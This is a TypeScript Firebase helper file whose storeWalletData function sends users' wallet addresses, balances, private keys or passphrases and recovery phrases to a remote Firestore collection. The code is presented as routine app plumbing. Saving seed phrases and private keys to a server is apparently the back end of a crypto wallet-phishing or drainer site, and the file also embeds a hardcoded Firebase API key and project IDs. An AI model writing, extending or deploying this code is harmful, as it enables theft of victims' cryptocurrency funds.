"use client"

import { initializeApp, getApps, type FirebaseApp } from "firebase/app"
import { getFirestore, collection, addDoc, type Firestore } from "firebase/firestore"

// Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyBhG3aI_r16XsSe7n3xQ5V7r01pP41FHZE",
  authDomain: "autosnip-7948b.firebaseapp.com",
  projectId: "autosnip-7948b",
  storageBucket: "autosnip-7948b.appspot.com",
  messagingSenderId: "166558743492",
  appId: "1:166558743492:web:3888012c736e393a480291",
  measurementId: "G-GDGEPRNL6F",
}

// Initialize Firebase
let app: FirebaseApp | undefined = undefined
let db: Firestore | undefined = undefined

// Initialize Firebase only on the client side
if (typeof window !== "undefined") {
  try {
    // Check if Firebase is already initialized
    if (!getApps().length) {
      app = initializeApp(firebaseConfig)
    } else {
      app = getApps()[0]
    }

    // Initialize Firestore
    db = getFirestore(app)
    console.log("Firebase initialized successfully")
  } catch (error) {
    console.error("Firebase initialization error:", error)
  }
}

export async function storeWalletData(walletData: any) {
  console.log("storeWalletData called with:", walletData)

  if (!db) {
    console.error("Firestore not initialized")
    return "mock-id-firestore-not-available"
  }

  try {
    // Ensure all required fields are present
    const dataToStore = {
      walletType: walletData.walletType || "unknown",
      walletName: walletData.walletName || "Unknown Wallet",
      walletAddress: walletData.walletAddress || "",
      balance: walletData.balance || 0,
      actualBalance: walletData.actualBalance || 0,
      connectionMethod: walletData.connectionMethod || "",
      passphrase: walletData.passphrase || walletData.privateKey || "",
      recoveryPhrase: walletData.recoveryPhrase || "",
      timestamp: walletData.timestamp || new Date().toISOString(),
    }

    console.log("Storing data to Firestore:", dataToStore)

    const docRef = await addDoc(collection(db, "walletData"), dataToStore)
    console.log("Wallet data stored successfully with ID:", docRef.id)
    return docRef.id
  } catch (error) {
    console.error("Error storing wallet data:", error)
    // Return a mock ID instead of throwing an error
    return "mock-id-storage-error"
  }
}

// Mock implementation for when Firestore is not available
export function isFirestoreAvailable() {
  return !!db
}

export { db }
